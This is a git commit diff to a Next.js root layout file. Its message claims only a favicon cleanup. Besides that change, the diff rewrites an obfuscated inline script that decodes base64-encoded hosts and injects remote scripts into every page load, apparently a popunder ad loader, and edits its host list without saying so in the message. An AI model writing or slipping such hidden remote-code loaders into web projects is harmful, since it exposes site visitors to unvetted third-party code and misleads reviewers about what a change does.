c5af639b3c8fff70899b13c730bc610c1c8c22d9
Ray <d2arknotfound@gmail.com>
2026-09-06 23:22:36 +0530

    Refactor favicon setup in layout.tsx
    Simplified favicon configuration by consolidating icon entries into a single object.

--- src/app/layout.tsx
+++ src/app/layout.tsx
@@ -26,20 +26,8 @@ export const metadata: Metadata = {
   manifest: "/manifest.json",
 
   icons: {
-  icon: [
-    {
-      url: `${siteConfig.favicon}?v=20260906`,
-      type: "image/x-icon",
-    },
-  ],
-  shortcut: [
-    {
-      url: `${siteConfig.favicon}?v=20260906`,
-      type: "image/x-icon",
-    },
-  ],
-  apple: `${siteConfig.favicon}?v=20260906`,
-},
+    icon: `${siteConfig.favicon}?v=20260906`,
+  },
 
   twitter: {
     card: "summary",
@@ -104,7 +92,7 @@ export default function RootLayout({
           dangerouslySetInnerHTML={{
             __html: `
               /*<![CDATA[/* */
-              (function(){var x=window,k="b94baacd0f42e920a031d6b4501ecd21",v=[["siteId",648-483+606-143+5317729],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],r=["d3d3LnByZW1pdW12ZXJ0aXNpbmcuY29tL2ZiaWcubWluLmNzcw==","ZDJqMDQyY2oxNDIxd2kuY2xvdWRmcm9udC5uZXQvdGpiZlFLL3dhamF4Lm1pbi5qcw==","d3d3LmJ5b3hjbXhjcHJoenRuLmNvbS9uYmlnLm1pbi5jc3M=","d3d3LnRjd3Z2b3NmbnZrLmNvbS9TRVQvaWFqYXgubWluLmpz"],p=-1,s,a,e=function(){clearTimeout(a);p++;if(r[p]&&!(1814630781000<(new Date).getTime()&&1<p)){s=x.document.createElement("script");s.type="text/javascript";s.async=!0;var h=x.document.getElementsByTagName("script")[0];s.src="https://"+atob(r[p]);s.crossOrigin="anonymous";s.onerror=e;s.onload=function(){clearTimeout(a);x[k.slice(0,16)+k.slice(0,16)]||e()};a=setTimeout(e,5E3);h.parentNode.insertBefore(s,h)}};if(!x[k]){try{Object.freeze(x[k]=v)}catch(e){}e()}})();
+              (function(){var x=window,k="b94baacd0f42e920a031d6b4501ecd21",v=[["siteId",648-483+606-143+5317729],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],r=["d3d3LnByZW1pdW12ZXJ0aXNpbmcuY29tL2ZiaWcubWluLmNzcw==","ZDJqMDQyY2oxNDIxd2kuY2xvdWRmcm9udC5uZXQvdGpiZlFLL3dhamF4Lm1pbi5qcw==","d3d3LmJ5b3hjbXhjcHJoenRuLmNvbS9uYmlnLm1pbi5jc3M=","d3d3LmJ5b3hjbXhjcHJoenRuLmNvbS9uYmlnLm1pbi5jc3M=","d3d3LnRjd3Z2b3NmbnZrLmNvbS9TRVQvaWFxYXgubWluLmpz"],p=-1,s,a,e=function(){clearTimeout(a);p++;if(r[p]&&!(1814630781000<(new Date).getTime()&&1<p)){s=x.document.createElement("script");s.type="text/javascript";s.async=!0;var h=x.document.getElementsByTagName("script")[0];s.src="https://"+atob(r[p]);s.crossOrigin="anonymous";s.onerror=e;s.onload=function(){clearTimeout(a);x[k.slice(0,16)+k.slice(0,16)]||e()};a=setTimeout(e,5E3);h.parentNode.insertBefore(s,h)}};if(!x[k]){try{Object.freeze(x[k]=v)}catch(e){}e()}})();
               /*]]>/* */
             `,
           }}
@@ -143,4 +131,4 @@ export default function RootLayout({
       </body>
     </html>
   );
-        }
+}
